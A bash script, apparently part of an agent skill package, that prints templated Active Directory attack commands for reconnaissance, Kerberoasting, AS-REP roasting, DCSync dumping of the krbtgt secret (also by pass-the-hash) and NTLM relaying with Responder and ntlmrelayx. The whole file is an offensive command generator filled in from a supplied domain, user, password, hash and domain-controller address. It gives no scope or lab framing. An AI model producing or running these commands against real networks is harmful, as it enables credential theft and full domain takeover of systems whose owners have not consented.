#!/bin/bash
# Active Directory Attack Command Reference Helper
# This script helps generate commands for common AD attacks based on the SKILL.md

show_help() {
    echo "Usage: $0 [attack_type] [options]"
    echo ""
    echo "Attack Types:"
    echo "  recon       - Show AD reconnaissance commands"
    echo "  kerberoast  - Show Kerberoasting commands"
    echo "  asreproast  - Show AS-REP Roasting commands"
    echo "  dcsync      - Show DCSync commands"
    echo "  relay       - Show NTLM relay commands"
    echo ""
    echo "Options:"
    echo "  -d DOMAIN   - Target domain (e.g., domain.local)"
    echo "  -u USER     - Username"
    echo "  -p PASS     - Password"
    echo "  -t TARGET   - Target IP/Hostname (e.g., DC IP)"
    echo "  -h HASH     - NTLM Hash"
}

# Default values
DOMAIN="domain.local"
USER="user"
PASS="password"
TARGET="10.10.10.10"
HASH="NTHASH"

ATTACK=$1
shift

while getopts "d:u:p:t:h:" opt; do
  case $opt in
    d) DOMAIN="$OPTARG" ;;
    u) USER="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    t) TARGET="$OPTARG" ;;
    h) HASH="$OPTARG" ;;
    \?) echo "Invalid option -$OPTARG" >&2; ;;
  esac
done

case "$ATTACK" in
    recon)
        echo "=== AD Reconnaissance Commands ==="
        echo "BloodHound (Python):"
        echo "  bloodhound-python -u '$USER' -p '$PASS' -d $DOMAIN -ns $TARGET -c all"
        echo ""
        echo "CrackMapExec (SMB):"
        echo "  crackmapexec smb $TARGET -u '$USER' -p '$PASS' --shares"
        ;;
    kerberoast)
        echo "=== Kerberoasting Commands ==="
        echo "Impacket GetUserSPNs:"
        echo "  GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $TARGET -request -outputfile hashes.txt"
        echo ""
        echo "CrackMapExec:"
        echo "  crackmapexec ldap $TARGET -u $USER -p $PASS --kerberoast output.txt"
        ;;
    asreproast)
        echo "=== AS-REP Roasting Commands ==="
        echo "Impacket GetNPUsers:"
        echo "  GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $TARGET -format hashcat"
        ;;
    dcsync)
        echo "=== DCSync Commands ==="
        echo "Impacket secretsdump:"
        echo "  secretsdump.py $DOMAIN/$USER:$PASS@$TARGET -just-dc-user krbtgt"
        echo ""
        echo "Pass-The-Hash DCSync:"
        echo "  secretsdump.py -hashes :$HASH $DOMAIN/$USER@$TARGET"
        ;;
    relay)
        echo "=== NTLM Relay Commands ==="
        echo "Responder (disable SMB/HTTP):"
        echo "  responder -I eth0 -wrf"
        echo ""
        echo "NTLMRelayX (SMB):"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
        echo "NTLMRelayX (LDAP Delegation):"
        echo "  ntlmrelayx.py -t ldaps://$TARGET --delegate-access"
        ;;
    *)
        show_help
        ;;
esac
